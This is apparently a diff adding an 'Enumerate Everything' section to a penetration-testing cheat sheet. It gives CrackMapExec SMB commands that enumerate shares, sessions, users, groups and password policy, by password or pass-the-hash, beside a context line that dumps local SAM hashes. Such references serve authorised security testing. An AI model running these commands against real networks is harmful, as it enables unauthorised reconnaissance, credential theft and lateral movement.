@@ -893,3 +893,37 @@ Dump local SAM hashes:
 crackmapexec smb 192.168.2.24 -u 'Administrator' -p 'Password' --local-auth --sam
 ```
 
+#### Enumerate Everything:
+
+> [!NOTE]
+> Some enumeration methods may fail depending on the privilege level of the user you're authenticating as
+
+Password authentication:
+
+```
+crackmapexec smb CIDR/IP -d targetdomain.tld -u username -p 'password' \
+--shares \
+--sessions \
+--disks \
+--loggedon-users \
+--users \
+--groups \
+--computers \
+--local-groups \
+--pass-pol
+```
+
+Pass the hash:
+
+```
+crackmapexec smb CIDR/IP -d targetdomain.tld -u username -H lm-hash:nt-hash \
+--shares \
+--sessions \
+--disks \
+--loggedon-users \
+--users \
+--groups \
+--computers \
+--local-groups \
+--pass-pol
+```
